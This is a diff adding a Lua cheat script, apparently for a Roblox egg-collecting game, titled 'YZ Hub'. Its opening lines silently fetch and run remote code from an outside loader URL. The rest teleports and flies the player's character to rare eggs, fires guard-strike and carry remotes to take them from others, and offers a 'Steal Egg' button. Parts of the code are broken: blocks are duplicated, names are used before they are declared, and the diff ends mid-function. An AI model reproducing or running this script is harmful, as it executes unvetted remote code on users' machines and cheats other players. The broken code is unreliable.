@@ -1,0 +1,1637 @@
+pcall(function()
+loadstring(game:HttpGet("https://flowauth.net/v1/loaders/e791c06c1f3335a8fdd2165bfda09c46.lua"))()
+end)
+
+local Players=game:GetService("Players")
+local RunService=game:GetService("RunService")
+local ReplicatedStorage=game:GetService("ReplicatedStorage")
+local Workspace=game:GetService("Workspace")
+
+local RS=ReplicatedStorage
+local LP=Players.LocalPlayer
+local Player=LP
+
+local Configs=RS:WaitForChild("Data"):WaitForChild("Assets"):WaitForChild("Configs")
+local EggModels=RS:WaitForChild("Assets"):WaitForChild("Models"):WaitForChild("Eggs")
+
+if not Player then
+	repeat
+		task.wait()
+		Player=Players.LocalPlayer
+	until Player
+end
+
+local Ignored={
+	["__OBJECTS"]=true,
+	["_Guards"]=true,
+	["__ClientTreadmillRenders"]=true,
+	["Stands"]=true,
+	["ScrambleLocalVisuals"]=true,
+	["__DEBRIS"]=true,
+	["Plots"]=true,
+	["ClientRenderedAssets"]=true,
+	["PlacedEggRenders"]=true
+}
+
+local PlayerNames={}
+local ConfigCache={}
+local MeshIdToCategory={}
+local CategoryCache={}
+local Eggs={}
+local Connections={}
+local MutationsModule
+
+local function RefreshPlayerNames()
+	table.clear(PlayerNames)
+
+	for _,p in ipairs(Players:GetPlayers()) do
+		PlayerNames[p.Name]=true
+		PlayerNames[p.DisplayName]=true
+	end
+end
+
+RefreshPlayerNames()
+
+Players.PlayerAdded:Connect(function(p)
+	PlayerNames[p.Name]=true
+	PlayerNames[p.DisplayName]=true
+end)
+
+Players.PlayerRemoving:Connect(function(p)
+	PlayerNames[p.Name]=nil
+	PlayerNames[p.DisplayName]=nil
+end)
+
+local function IsIgnored(obj)
+	if not obj then
+		return true
+	end
+
+	if PlayerNames[obj.Name] then
+		return true
+	end
+
+	local current=obj
+
+	while current and current~=Workspace do
+		if Ignored[current.Name] then
+			return true
+		end
+
+		if PlayerNames[current.Name] then
+			return true
+		end
+
+		current=current.Parent
+	end
+
+	return false
+end
+
+local function LoadConfig(config)
+	if ConfigCache[config] then
+		return ConfigCache[config]
+	end
+
+	local ok,module=pcall(require,config)
+
+	if not ok or type(module)~="table" then
+		return
+	end
+
+	local data={
+		Category=config.Name,
+		DisplayName=module.DisplayName or config.Name,
+		EarningRate=tonumber(module.EarningRate) or 0,
+		ModelName=(module.Egg and module.Egg.ModelName) or config.Name
+	}
+
+	ConfigCache[config]=data
+
+	return data
+end
+
+for _,config in ipairs(Configs:GetChildren()) do
+	local data=LoadConfig(config)
+
+	if data then
+		local template=EggModels:FindFirstChild(data.ModelName)
+
+		if template then
+			for _,d in ipairs(template:GetDescendants()) do
+				local meshId
+
+				if d:IsA("MeshPart") then
+					meshId=d.MeshId
+				elseif d:IsA("SpecialMesh") then
+					meshId=d.MeshId
+				end
+
+				if meshId and meshId~="" then
+					MeshIdToCategory[meshId]=data.Category
+				end
+			end
+		end
+	end
+end
+
+pcall(function()
+	MutationsModule=require(RS.Shared.Modules.Mutations)
+end)
+
+local function FindAssetCategory(model)
+	local cached=CategoryCache[model]
+
+	if cached then
+		return cached
+	end
+
+	for _,d in ipairs(model:GetDescendants()) do
+		local meshId
+
+		if d:IsA("MeshPart") then
+			meshId=d.MeshId
+		elseif d:IsA("SpecialMesh") then
+			meshId=d.MeshId
+		end
+
+		if meshId and meshId~="" then
+			local category=MeshIdToCategory[meshId]
+
+			if category then
+				CategoryCache[model]=category
+				return category
+			end
+		end
+	end
+end
+
+local RarityConfigFile="YZHub_RarityConfig.json"
+
+local SelectedRarities={
+	Secret=true,
+	Eternal=true,
+	Divine=true
+}
+
+local function SaveRarityConfig()
+	if not writefile then
+		return
+	end
+
+	pcall(function()
+		writefile(
+			RarityConfigFile,
+			game:GetService("HttpService"):JSONEncode(SelectedRarities)
+		)
+	end)
+end
+
+local function LoadRarityConfig()
+	if not readfile or not isfile or not isfile(RarityConfigFile) then
+		SaveRarityConfig()
+		return
+	end
+
+	pcall(function()
+		local HttpService=game:GetService("HttpService")
+		local Data=HttpService:JSONDecode(readfile(RarityConfigFile))
+
+		if type(Data)=="table" then
+			for _,RarityName in ipairs({
+				"Secret",
+				"Eternal",
+				"Divine"
+			}) do
+				if Data[RarityName]~=nil then
+					SelectedRarities[RarityName]=Data[RarityName]==true
+				end
+			end
+		end
+	end)
+end
+
+LoadRarityConfig()
+
+local function GetEggRarity(Category)
+	local ConfigObject=Configs:FindFirstChild(Category)
+
+	if not ConfigObject then
+		return nil
+	end
+
+	local AssetData=ConfigCache[ConfigObject]
+
+	if not AssetData then
+		return nil
+	end
+
+	local RarityModule
+
+	pcall(function()
+		RarityModule=require(
+			RS
+				:WaitForChild("Data")
+				:WaitForChild("Rarity")
+		)
+	end)
+
+	if not RarityModule then
+		return nil
+	end
+
+	local Assets=nil
+
+	pcall(function()
+		local Data=RS:FindFirstChild("Data")
+		local AssetModule=Data and Data:FindFirstChild("Assets")
+
+		if AssetModule and AssetModule:IsA("ModuleScript") then
+			Assets=require(AssetModule)
+		end
+	end)
+
+	if Assets and Assets.Directory then
+		local DirectoryData=Assets.Directory[Category]
+
+		if DirectoryData then
+			return DirectoryData.Rarity
+		end
+	end
+
+	return nil
+end
+
+local function IsSelectedRarity(Category)
+	local RarityName=GetEggRarity(Category)
+
+	if not RarityName then
+		return false
+	end
+
+	local Key=tostring(RarityName):lower():gsub("%s+","")
+
+	for Name,Enabled in pairs(SelectedRarities) do
+		if Enabled and Name:lower()==Key then
+			return true
+		end
+	end
+
+	return false
+end
+
+local function CalculateRate(base,scale,mutations)
+	base=tonumber(base) or 0
+	scale=tonumber(scale) or 1
+
+	local payout
+
+	if scale<=5 then
+		payout=scale^1.85
+	else
+		payout=(scale/5)^1.2*19.637875755794113
+	end
+
+	local multiplier=1
+
+	if type(mutations)=="table" and #mutations>0 and MutationsModule then
+		local ok,result=pcall(function()
+			return MutationsModule.EarningsFor(mutations)
+		end)
+
+		if ok and type(result)=="number" then
+			multiplier=result
+		end
+	end
+
+	return math.round(base*payout*multiplier)
+end
+
+local function IsRandomUID(name)
+	return type(name)=="string"
+		and #name==32
+		and name:match("^[%da-f]+$")~=nil
+end
+
+local function GetEggData(model)
+	if not model:IsA("Model") or IsIgnored(model) then
+		return
+	end
+
+	if not IsRandomUID(model.Name) then
+		return
+	end
+
+	local category=FindAssetCategory(model)
+
+	if not category then
+		return
+	end
+
+	local configObject=Configs:FindFirstChild(category)
+	local config=configObject and ConfigCache[configObject]
+
+	if not config then
+		return
+	end
+
+	local scale=model:GetAttribute("AssetScale") or 1
+	local mutations=model:GetAttribute("Mutations") or {}
+
+	return {
+		Model=model,
+		UID=model.Name,
+		Category=category,
+		DisplayName=config.DisplayName,
+		EarningRate=CalculateRate(
+			config.EarningRate,
+			scale,
+			mutations
+		)
+	}
+end
+
+local function RemoveEgg(model)
+	Eggs[model]=nil
+	CategoryCache[model]=nil
+
+	local connection=Connections[model]
+
+	if connection then
+		connection:Disconnect()
+		Connections[model]=nil
+	end
+end
+
+local function TrackEgg(model)
+	if not model:IsA("Model") or not model.Parent then
+		return
+	end
+
+	local data=GetEggData(model)
+
+	if not data then
+		return
+	end
+
+	Eggs[model]=data
+
+	if not Connections[model] then
+		Connections[model]=model.AncestryChanged:Connect(function()
+			if not model:IsDescendantOf(Workspace) or IsIgnored(model) then
+				RemoveEgg(model)
+				return
+			end
+
+			local updated=GetEggData(model)
+
+			if updated then
+				Eggs[model]=updated
+			else
+				RemoveEgg(model)
+			end
+		end)
+	end
+end
+
+for _,obj in ipairs(Workspace:GetDescendants()) do
+	if obj:IsA("Model") then
+		TrackEgg(obj)
+	end
+end
+
+Workspace.DescendantAdded:Connect(function(obj)
+	if obj:IsA("Model") then
+		task.defer(TrackEgg,obj)
+	elseif obj:IsA("MeshPart") or obj:IsA("SpecialMesh") then
+		local model=obj:FindFirstAncestorOfClass("Model")
+
+		if model then
+			task.defer(TrackEgg,model)
+		end
+	end
+end)
+
+Workspace.DescendantRemoving:Connect(function(obj)
+	if obj:IsA("Model") then
+		RemoveEgg(obj)
+	end
+end)
+
+local function RefreshEgg(model)
+	if not model or not model.Parent then
+		return
+	end
+
+	local data=GetEggData(model)
+
+	if data then
+		Eggs[model]=data
+	else
+		RemoveEgg(model)
+	end
+end
+
+local function GetBestEgg()
+	local best
+	local bestRate=-math.huge
+
+	for model,data in pairs(Eggs) do
+		if model.Parent and not IsIgnored(model) then
+			local configObject=Configs:FindFirstChild(data.Category)
+			local config=configObject and ConfigCache[configObject]
+
+			if config and IsSelectedRarity(data.Category) then
+				local scale=model:GetAttribute("AssetScale") or 1
+				local mutations=model:GetAttribute("Mutations") or {}
+
+				data.EarningRate=CalculateRate(
+					config.EarningRate,
+					scale,
+					mutations
+				)
+
+				if data.EarningRate>bestRate then
+					best=data
+					bestRate=data.EarningRate
+				end
+			end
+		else
+			RemoveEgg(model)
+		end
+	end
+
+	return best
+end
+
+local function IsValidEgg(data)
+	if not data or not data.Model or not data.Model.Parent then
+		return false
+	end
+
+	if IsIgnored(data.Model) then
+		return false
+	end
+
+	if not IsRandomUID(data.Model.Name) then
+		return false
+	end
+
+	return Eggs[data.Model]~=nil
+		and data.UID==data.Model.Name
+end
+
+local function GetModelCFrame(model)
+	if not model then
+		return
+	end
+
+	if model:IsA("BasePart") then
+		return model.CFrame
+	end
+
+	if model:IsA("Model") then
+		if model.PrimaryPart then
+			return model.PrimaryPart.CFrame
+		end
+
+		local ok,cf=pcall(function()
+			return model:GetPivot()
+		end)
+
+		if ok then
+			return cf
+		end
+	end
+end
+
+task.spawn(function()
+	while true do
+		task.wait(1)
+
+		for model in pairs(Eggs) do
+			RefreshEgg(model)
+		end
+	end
+end)
+
+local Networking=
+	ReplicatedStorage
+		:WaitForChild("Packages")
+		:WaitForChild("Networking")
+
+local AskFieldEggCarry=
+	Networking:WaitForChild(
+		"RF/EggWorld/AskFieldEggCarry"
+	)
+
+local FieldEggCarry=
+	Networking:WaitForChild(
+		"RE/EggWorld/FieldEggCarry"
+	)
+
+local AskFieldEggDrop=
+	Networking:WaitForChild(
+		"RF/EggWorld/AskFieldEggDrop"
+	)
+
+local ForestStrike=
+	Networking:WaitForChild(
+		"RE/GuardPatrol/ForestStrike"
+	)
+
+local function GetRoot()
+	local Character=
+		Player.Character
+		or Player.CharacterAdded:Wait()
+
+	return Character:WaitForChild(
+		"HumanoidRootPart"
+	)
+end
+
+local BodyVelocity=nil
+local BodyGyro=nil
+local FlyConnection=nil
+
+local function CleanupMovers(Root)
+	if FlyConnection then
+		FlyConnection:Disconnect()
+		FlyConnection=nil
+	end
+
+	if BodyVelocity then
+		pcall(function()
+			BodyVelocity.Velocity=Vector3.zero
+			BodyVelocity.MaxForce=Vector3.zero
+		end)
+
+		BodyVelocity:Destroy()
+		BodyVelocity=nil
+	end
+
+	if BodyGyro then
+		pcall(function()
+			BodyGyro.MaxTorque=Vector3.zero
+		end)
+
+		BodyGyro:Destroy()
+		BodyGyro=nil
+	end
+
+	if Root and Root.Parent then
+		for _,Child in ipairs(Root:GetChildren()) do
+			if Child.Name=="YokudoBV"
+				or Child.Name=="YokudoBG"
+			then
+				pcall(function()
+					Child:Destroy()
+				end)
+			end
+		end
+	end
+end
+
+local function MoveToPosition(
+	Root,
+	TargetPosition,
+	StepDistance,
+	Interval
+)
+	if not Root or not Root.Parent then
+		return false
+	end
+
+	StepDistance=StepDistance or 100
+	Interval=Interval or 0.1
+
+	while Root.Parent do
+		local CurrentPosition=Root.Position
+
+		local Target=
+			Vector3.new(
+				TargetPosition.X,
+				TargetPosition.Y+1.585,
+				TargetPosition.Z
+			)
+
+		local Offset=Target-CurrentPosition
+		local Distance=Offset.Magnitude
+
+		if Distance<=0.5 then
+			Root.CFrame=
+				CFrame.new(
+					Target,
+					Target+Root.CFrame.LookVector
+				)
+
+			return true
+		end
+
+		local Direction=Offset.Unit
+
+		local MoveDistance=
+			math.min(
+				StepDistance,
+				Distance
+			)
+
+		local NewPosition=
+			CurrentPosition+
+			Direction*MoveDistance
+
+		Root.CFrame=
+			CFrame.new(
+				NewPosition,
+				NewPosition+Direction
+			)
+
+		task.wait(Interval)
+	end
+
+	return false
+end
+
+local function FlyToBestEgg(Root,Destination)
+	if not Root or not Root.Parent then
+		return false
+	end
+
+	CleanupMovers(Root)
+
+	local Character=Root.Parent
+	local Humanoid=Character:FindFirstChildOfClass("Humanoid")
+
+	if Humanoid then
+		Humanoid.PlatformStand=true
+		Humanoid.AutoRotate=false
+	end
+
+	local FlyPosition=
+		Vector3.new(
+			Destination.X,
+			Destination.Y+70,
+			Destination.Z
+		)
+
+	BodyVelocity=Instance.new("BodyVelocity")
+	BodyVelocity.Name="YokudoBV"
+	BodyVelocity.MaxForce=Vector3.new(
+		math.huge,
+		math.huge,
+		math.huge
+	)
+	BodyVelocity.P=1250
+	BodyVelocity.Velocity=Vector3.zero
+	BodyVelocity.Parent=Root
+
+	BodyGyro=Instance.new("BodyGyro")
+	BodyGyro.Name="YokudoBG"
+	BodyGyro.MaxTorque=Vector3.new(
+		math.huge,
+		math.huge,
+		math.huge
+	)
+	BodyGyro.P=3000
+	BodyGyro.D=500
+	BodyGyro.CFrame=Root.CFrame
+	BodyGyro.Parent=Root
+
+	local Speed=275
+	local StartTime=tick()
+	local Timeout=30
+	local ArriveDistance=4.5
+	local Finished=false
+
+	FlyConnection=RunService.Heartbeat:Connect(function()
+		if Finished then
+			return
+		end
+
+		if not Root or not Root.Parent then
+			Finished=true
+			return
+		end
+
+		local CurrentPosition=Root.Position
+		local Direction=FlyPosition-CurrentPosition
+		local Distance=Direction.Magnitude
+
+		if Distance<=ArriveDistance then
+			Finished=true
+			BodyVelocity.Velocity=Vector3.zero
+			return
+		end
+
+		if tick()-StartTime>=Timeout then
+			Finished=true
+			return
+		end
+
+		BodyVelocity.Velocity=
+			Direction.Unit*Speed
+
+		local FlatDirection=
+			Vector3.new(
+				Direction.X,
+				0,
+				Direction.Z
+			)
+
+		if FlatDirection.Magnitude>3 then
+			BodyGyro.CFrame=
+				CFrame.new(
+					CurrentPosition,
+					CurrentPosition+FlatDirection.Unit
+				)
+		end
+	end)
+
+	while not Finished do
+		if not Root or not Root.Parent then
+			break
+		end
+
+		task.wait()
+	end
+
+	if BodyVelocity then
+		BodyVelocity.Velocity=Vector3.zero
+	end
+
+	if Humanoid then
+		Humanoid.PlatformStand=false
+		Humanoid.AutoRotate=true
+	end
+
+	CleanupMovers(Root)
+
+	return Root
+		and Root.Parent
+		and (Root.Position-FlyPosition).Magnitude<=5
+end
+
+local function ProcessEgg()
+	local Root=
+		GetRoot()
+
+	local BestEgg=
+		GetBestEgg()
+
+	if not BestEgg or not IsValidEgg(BestEgg) then
+		return
+	end
+
+	local BestCFrame=
+		GetModelCFrame(
+			BestEgg.Model
+		)
+
+	if not BestCFrame then
+		return
+	end
+
+	local BestPosition=
+		BestCFrame.Position
+
+	local StartPosition=
+		Vector3.new(
+			541,
+			71,
+			-365
+		)
+
+	local ReachedStart=
+		MoveToPosition(
+			Root,
+			StartPosition,
+			350,
+			0.045
+		)
+
+	task.wait(0.1)
+
+	local ReachedEgg=
+	FlyToBestEgg(
+		Root,
+		BestPosition
+	)
+
+if not ReachedEgg then
+	return
+end
+
+local ExactBestCFrame=
+	GetModelCFrame(
+		BestEgg.Model
+	)
+
+if ExactBestCFrame then
+	Root.CFrame=ExactBestCFrame
+	Root.AssemblyLinearVelocity=Vector3.zero
+	Root.AssemblyAngularVelocity=Vector3.zero
+	task.wait(0.05)
+end
+
+pcall(function()
+	ForestStrike:FireServer()
+end)
+
+task.wait(1)
+
+	pcall(function()
+		AskFieldEggCarry:InvokeServer({
+			Uid=BestEgg.UID
+		})
+	end)
+
+	pcall(function()
+		FieldEggCarry:FireServer({
+			Uid=BestEgg.UID
+		})
+	end)
+
+	task.wait(0.15)
+
+	local FirstDestination=
+		Vector3.new(
+			745,
+			71,
+			-413
+		)
+
+	local ReachedFirstDestination=
+		MoveToPosition(
+			Root,
+			FirstDestination,
+			400,
+			0.055
+		)
+
+	if not ReachedFirstDestination then
+		return
+	end
+
+	task.wait(0.5)
+
+	pcall(function()
+		AskFieldEggDrop:InvokeServer({
+			Reason="PlayerRequest"
+		})
+	end)
+
+	task.wait(0.2)
+
+	pcall(function()
+		AskFieldEggCarry:InvokeServer({
+			Uid=BestEgg.UID
+		})
+	end)
+
+	pcall(function()
+		FieldEggCarry:FireServer({
+			Uid=BestEgg.UID
+		})
+	end)
+
+	task.wait(0.45)
+
+	local FinalDestination=
+		Vector3.new(
+			506,
+			71,
+			-419
+		)
+
+	Root.CFrame=
+		CFrame.new(
+			FinalDestination
+		)
+
+	Root.AssemblyLinearVelocity=Vector3.zero
+	Root.AssemblyAngularVelocity=Vector3.zero
+end
+
+local TweenService=game:GetService("TweenService")
+local UserInputService=game:GetService("UserInputService")
+
+local PlayerGui=Player:WaitForChild("PlayerGui")
+
+local OldGui=PlayerGui:FindFirstChild("YZHubGUI")
+if OldGui then
+	OldGui:Destroy()
+end
+
+local Assets=nil
+local Rarity=nil
+local AssetViewport=nil
+
+pcall(function()
+	local Data=RS:FindFirstChild("Data")
+	local AssetData=Data and Data:FindFirstChild("Assets")
+
+	if AssetData and AssetData:IsA("ModuleScript") then
+		Assets=require(AssetData)
+	end
+end)
+
+pcall(function()
+	Rarity=require(
+		RS
+			:WaitForChild("Data")
+			:WaitForChild("Rarity")
+	)
+end)
+
+pcall(function()
+	AssetViewport=require(
+		RS
+			:WaitForChild("Client")
+			:WaitForChild("AssetViewport")
+	)
+end)
+
+local Players=game:GetService("Players")
+local RunService=game:GetService("RunService")
+local UserInputService=game:GetService("UserInputService")
+local ReplicatedStorage=game:GetService("ReplicatedStorage")
+
+local LP=Players.LocalPlayer
+local Player=LP
+
+local PlayerGui=LP:WaitForChild("PlayerGui")
+
+local OldGUI=PlayerGui:FindFirstChild("YZHubGUI")
+if OldGUI then
+	OldGUI:Destroy()
+end
+
+local Assets=nil
+local Data=ReplicatedStorage:FindFirstChild("Data")
+Data=Data and Data:FindFirstChild("Assets") or ReplicatedStorage:FindFirstChild("Assets")
+
+if Data and Data:IsA("ModuleScript") then
+	local OK,Result=pcall(require,Data)
+	if OK then
+		Assets=Result
+	end
+end
+
+if not Assets then
+	local function FindModule(Name)
+		local Found
+		for _,Object in ipairs(ReplicatedStorage:GetDescendants()) do
+			if Object:IsA("ModuleScript") and Object.Name:lower()==Name:lower() then
+				Found=Object
+				break
+			end
+		end
+
+		if Found then
+			local OK,Result=pcall(require,Found)
+			if OK then
+				return Result
+			end
+		end
+	end
+
+	Assets=FindModule("Assets")
+end
+
+local Rarity=require(
+	ReplicatedStorage
+		:WaitForChild("Data")
+		:WaitForChild("Rarity")
+)
+
+local AssetViewport=require(
+	ReplicatedStorage
+		:WaitForChild("Client")
+		:WaitForChild("AssetViewport")
+)
+
+local GUI=Instance.new("ScreenGui")
+GUI.Name="YZHubGUI"
+GUI.ResetOnSpawn=false
+GUI.IgnoreGuiInset=true
+GUI.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
+GUI.Parent=PlayerGui
+
+local Main=Instance.new("Frame")
+Main.Name="Main"
+Main.Size=UDim2.new(0,315,0,250)
+Main.Position=UDim2.new(0.5,-157,0.5,-125)
+Main.BackgroundColor3=Color3.fromRGB(12,12,15)
+Main.BackgroundTransparency=0
+Main.BorderSizePixel=0
+Main.Active=true
+Main.Parent=GUI
+
+local MainCorner=Instance.new("UICorner")
+MainCorner.CornerRadius=UDim.new(0,14)
+MainCorner.Parent=Main
+
+local Stroke=Instance.new("UIStroke")
+Stroke.Thickness=2
+Stroke.Transparency=0
+Stroke.Parent=Main
+
+local Glow=Instance.new("UIStroke")
+Glow.Thickness=6
+Glow.Transparency=0.65
+Glow.Parent=Main
+
+local Title=Instance.new("TextLabel")
+Title.Name="Title"
+Title.Size=UDim2.new(1,-20,0,34)
+Title.Position=UDim2.fromOffset(10,7)
+Title.BackgroundTransparency=1
+Title.Text="YZ Hub"
+Title.TextColor3=Color3.fromRGB(255,255,255)
+Title.TextSize=21
+Title.Font=Enum.Font.GothamBold
+Title.TextXAlignment=Enum.TextXAlignment.Left
+Title.Parent=Main
+
+local StealButton=Instance.new("TextButton")
+StealButton.Name="StealButton"
+StealButton.Size=UDim2.new(1,-20,0,38)
+StealButton.Position=UDim2.fromOffset(10,47)
+StealButton.BackgroundColor3=Color3.fromRGB(25,25,30)
+StealButton.BackgroundTransparency=0
+StealButton.BorderSizePixel=0
+StealButton.Text="Steal Egg"
+StealButton.TextColor3=Color3.fromRGB(255,255,255)
+StealButton.TextSize=14
+StealButton.Font=Enum.Font.GothamBold
+StealButton.AutoButtonColor=true
+StealButton.Parent=Main
+
+local ButtonCorner=Instance.new("UICorner")
+ButtonCorner.CornerRadius=UDim.new(0,9)
+ButtonCorner.Parent=StealButton
+
+local ButtonStroke=Instance.new("UIStroke")
+ButtonStroke.Thickness=1
+ButtonStroke.Transparency=0.35
+ButtonStroke.Parent=StealButton
+
+local RaritySelector=Instance.new("Frame")
+RaritySelector.Name="RaritySelector"
+RaritySelector.Position=UDim2.new(0,10,0,100)
+RaritySelector.Size=UDim2.new(1,-95,0,30)
+RaritySelector.BackgroundTransparency=1
+RaritySelector.ZIndex=20
+RaritySelector.Parent=Main
+
+local SelectRarity=Instance.new("TextButton")
+SelectRarity.Name="SelectRarity"
+SelectRarity.Size=UDim2.new(1,0,0,28)
+SelectRarity.Position=UDim2.fromOffset(0,0)
+SelectRarity.BackgroundColor3=Color3.fromRGB(25,25,30)
+SelectRarity.BackgroundTransparency=0.2
+SelectRarity.BorderSizePixel=0
+SelectRarity.Text="Select Rarity"
+SelectRarity.TextColor3=Color3.fromRGB(255,255,255)
+SelectRarity.TextSize=12
+SelectRarity.Font=Enum.Font.GothamBold
+SelectRarity.ZIndex=21
+SelectRarity.Parent=RaritySelector
+
+local SelectCorner=Instance.new("UICorner")
+SelectCorner.CornerRadius=UDim.new(0,7)
+SelectCorner.Parent=SelectRarity
+
+local RarityList=Instance.new("Frame")
+RarityList.Name="RarityList"
+RarityList.Size=UDim2.new(1,0,0,93)
+RarityList.Position=UDim2.fromOffset(0,30)
+RarityList.BackgroundColor3=Color3.fromRGB(15,15,19)
+RarityList.BackgroundTransparency=0.05
+RarityList.BorderSizePixel=0
+RarityList.Visible=false
+RarityList.ZIndex=30
+RarityList.Parent=RaritySelector
+
+local ListCorner=Instance.new("UICorner")
+ListCorner.CornerRadius=UDim.new(0,7)
+ListCorner.Parent=RarityList
+
+local UpdateBestEgg
+
+local function GetBestEggData()
+	local OK,Result=pcall(function()
+		return GetBestEgg()
+	end)
+
+	if OK and Result and IsValidEgg(Result) then
+		return Result
+	end
+
+	return nil
+end
+
+UpdateBestEgg=function()
+	local Egg=GetBestEggData()
+
+	if not Egg then
+		NameLabel.Text="No Egg"
+		MoneyLabel.Text="Money: 0"
+		RarityLabel.Text="Rarity: Unknown"
+		RarityLabel.TextColor3=Color3.fromRGB(255,255,255)
+		UpdatePreview(nil)
+		return
+	end
+
+	local DisplayName=tostring(
+		Egg.DisplayName
+		or Egg.Category
+		or "Unknown"
+	)
+
+	NameLabel.Text=DisplayName
+
+	MoneyLabel.Text="Money: "..FormatMoney(
+		Egg.EarningRate or 0
+	)
+
+	local Category=Egg.Category
+	local AssetData=
+		Assets
+		and Assets.Directory
+		and Assets.Directory[Category]
+
+	local RarityName=nil
+
+	if AssetData then
+		RarityName=AssetData.Rarity
+	end
+
+	RarityName=
+		RarityName
+		or Egg.Rarity
+		or Egg.RarityName
+		or "Unknown"
+
+	local RarityData=
+		GetRarityConfig(RarityName)
+
+	local DisplayRarity=
+		RarityName
+
+	if RarityData
+		and RarityData.DisplayName
+	then
+		DisplayRarity=
+			RarityData.DisplayName
+	end
+
+	RarityLabel.Text=
+		"Rarity: "
+		..tostring(DisplayRarity)
+
+	RarityLabel.TextColor3=
+		GetRarityColor(RarityName)
+
+	UpdatePreview(Category)
+end
+
+local RarityNames={
+	"Secret",
+	"Eternal",
+	"Divine"
+}
+
+local RarityButtons={}
+
+local RarityColors={
+	Secret=Color3.fromRGB(255,255,255),
+	Eternal=Color3.fromRGB(255,220,80),
+	Divine=Color3.fromRGB(255,90,90)
+}
+
+local function UpdateRarityText()
+	local Selected={}
+
+	for _,Name in ipairs(RarityNames) do
+		if SelectedRarities[Name] then
+			table.insert(Selected,Name)
+		end
+	end
+
+	if #Selected==0 then
+		SelectRarity.Text="Select Rarity: None"
+	elseif #Selected==#RarityNames then
+		SelectRarity.Text="Select Rarity: All"
+	else
+		SelectRarity.Text=
+			"Select Rarity: "
+			..table.concat(Selected,", ")
+	end
+end
+
+for Index,Name in ipairs(RarityNames) do
+	local Button=Instance.new("TextButton")
+	Button.Name=Name
+	Button.Size=UDim2.new(1,-8,0,27)
+	Button.Position=UDim2.fromOffset(
+		4,
+		(Index-1)*30+3
+	)
+	Button.BackgroundColor3=Color3.fromRGB(25,25,30)
+	Button.BackgroundTransparency=0.2
+	Button.BorderSizePixel=0
+	Button.Text=""
+	Button.ZIndex=31
+	Button.Parent=RarityList
+
+	local Corner=Instance.new("UICorner")
+	Corner.CornerRadius=UDim.new(0,6)
+	Corner.Parent=Button
+
+	local Check=Instance.new("TextLabel")
+	Check.Name="Check"
+	Check.Size=UDim2.fromOffset(25,27)
+	Check.Position=UDim2.fromOffset(2,0)
+	Check.BackgroundTransparency=1
+	Check.Text=
+		SelectedRarities[Name]
+		and "✓"
+		or ""
+	Check.TextColor3=RarityColors[Name]
+	Check.TextSize=14
+	Check.Font=Enum.Font.GothamBold
+	Check.ZIndex=32
+	Check.Parent=Button
+
+	local Label=Instance.new("TextLabel")
+	Label.Name="Label"
+	Label.Size=UDim2.new(1,-30,1,0)
+	Label.Position=UDim2.fromOffset(28,0)
+	Label.BackgroundTransparency=1
+	Label.Text=Name
+	Label.TextColor3=RarityColors[Name]
+	Label.TextSize=12
+	Label.Font=Enum.Font.GothamBold
+	Label.TextXAlignment=Enum.TextXAlignment.Left
+	Label.ZIndex=32
+	Label.Parent=Button
+
+	RarityButtons[Name]=Check
+
+	Button.MouseButton1Click:Connect(function()
+		SelectedRarities[Name]=
+			not SelectedRarities[Name]
+
+		Check.Text=
+			SelectedRarities[Name]
+			and "✓"
+			or ""
+
+		SaveRarityConfig()
+		UpdateRarityText()
+
+		if UpdateBestEgg then
+			task.defer(UpdateBestEgg)
+		end
+	end)
+end
+
+SelectRarity.MouseButton1Click:Connect(function()
+	RarityList.Visible=
+		not RarityList.Visible
+end)
+
+UpdateRarityText()
+
+local Info=Instance.new("Frame")
+Info.Name="Info"
+Info.Position=UDim2.new(0,10,0,145)
+Info.Size=UDim2.new(1,-20,0,100)
+Info.BackgroundColor3=Color3.fromRGB(20,20,24)
+Info.BackgroundTransparency=0.345
+Info.BorderSizePixel=0
+Info.ClipsDescendants=true
+Info.Parent=Main
+
+local InfoCorner=Instance.new("UICorner")
+InfoCorner.CornerRadius=UDim.new(0,10)
+InfoCorner.Parent=Info
+
+local Preview=Instance.new("Frame")
+Preview.Name="Preview"
+Preview.Size=UDim2.fromOffset(72,72)
+Preview.Position=UDim2.fromOffset(10,14)
+Preview.BackgroundColor3=Color3.fromRGB(0,0,0)
+Preview.BackgroundTransparency=0.5
+Preview.BorderSizePixel=0
+Preview.ClipsDescendants=true
+Preview.Parent=Info
+
+local PreviewCorner=Instance.new("UICorner")
+PreviewCorner.CornerRadius=UDim.new(0,9)
+PreviewCorner.Parent=Preview
+
+local NameLabel=Instance.new("TextLabel")
+NameLabel.Name="Name"
+NameLabel.Size=UDim2.new(1,-95,0,27)
+NameLabel.Position=UDim2.fromOffset(91,8)
+NameLabel.BackgroundTransparency=1
+NameLabel.Text="No Egg"
+NameLabel.TextColor3=Color3.fromRGB(255,255,255)
+NameLabel.TextSize=15
+NameLabel.Font=Enum.Font.GothamBold
+NameLabel.TextXAlignment=Enum.TextXAlignment.Left
+NameLabel.TextTruncate=Enum.TextTruncate.AtEnd
+NameLabel.Parent=Info
+
+local MoneyLabel=Instance.new("TextLabel")
+MoneyLabel.Name="Money"
+MoneyLabel.Size=UDim2.new(1,-95,0,25)
+MoneyLabel.Position=UDim2.fromOffset(91,36)
+MoneyLabel.BackgroundTransparency=1
+MoneyLabel.Text="Money: 0"
+MoneyLabel.TextColor3=Color3.fromRGB(0,255,0)
+MoneyLabel.TextSize=14
+MoneyLabel.Font=Enum.Font.GothamBold
+MoneyLabel.TextXAlignment=Enum.TextXAlignment.Left
+MoneyLabel.Parent=Info
+
+local RarityLabel=Instance.new("TextLabel")
+RarityLabel.Name="Rarity"
+RarityLabel.Size=UDim2.new(1,-95,0,25)
+RarityLabel.Position=UDim2.fromOffset(91,62)
+RarityLabel.BackgroundTransparency=1
+RarityLabel.Text="Rarity: Unknown"
+RarityLabel.TextColor3=Color3.fromRGB(255,255,255)
+RarityLabel.TextSize=13
+RarityLabel.Font=Enum.Font.GothamSemibold
+RarityLabel.TextXAlignment=Enum.TextXAlignment.Left
+RarityLabel.Parent=Info
+
+local function FormatMoney(Value)
+	local Number=tonumber(Value) or 0
+	local Abs=math.abs(Number)
+
+	local function Short(N)
+		return string.format("%.2f",N)
+			:gsub("(%..-)0+$","%1")
+			:gsub("%.$","")
+	end
+
+	if Abs>=1e15 then
+		return Short(Number/1e15).."Q"
+	elseif Abs>=1e12 then
+		return Short(Number/1e12).."T"
+	elseif Abs>=1e9 then
+		return Short(Number/1e9).."B"
+	elseif Abs>=1e6 then
+		return Short(Number/1e6).."M"
+	elseif Abs>=1e3 then
+		return Short(Number/1e3).."K"
+	end
+
+	return tostring(math.floor(Number+0.5))
+end
+
+local function GetRarityConfig(Name)
